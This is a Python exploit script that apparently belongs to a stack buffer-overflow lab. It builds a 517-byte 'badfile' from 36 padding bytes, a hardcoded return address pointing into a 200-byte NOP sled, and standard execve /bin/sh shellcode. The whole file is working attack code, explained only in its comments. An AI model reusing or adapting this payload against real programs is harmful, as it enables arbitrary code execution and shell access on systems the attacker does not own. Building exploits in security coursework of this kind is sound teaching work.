#!/usr/bin/env python3
import struct

# 1. The Truth: Address from ./stack_debug
# We use this because GDB shifts the stack memory slightly.
base_buffer_addr = 0xffffcb08

# 2. The Target: Where we want to land
# The NOP sled starts at offset 40 (36 padding + 4 ret).
# We add 100 to the base address to land safely in the middle of our NOP sled.
# 0xffffcb08 + 100 = 0xffffcb6c
jump_target = base_buffer_addr + 100

print(f"[+] Base Buffer Address: {hex(base_buffer_addr)}")
print(f"[+] Landing Target:      {hex(jump_target)}")

# 3. The Shellcode (Standard /bin/sh execve)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# 4. Construct the Payload
# [ 36 bytes of 'A' ] [ Jump Address ] [ 200 bytes of NOPs ] [ Shellcode ]
payload = b'A' * 36
payload += struct.pack("<I", jump_target)  # The Return Address
payload += b'\x90' * 200                   # The NOP Sled
payload += shellcode                       # The Payload

# Fill the rest of the 517-byte file with padding
payload += b'C' * (517 - len(payload))

# Write the file
with open('badfile', 'wb') as f:
    f.write(payload)

print("[+] badfile created successfully.")
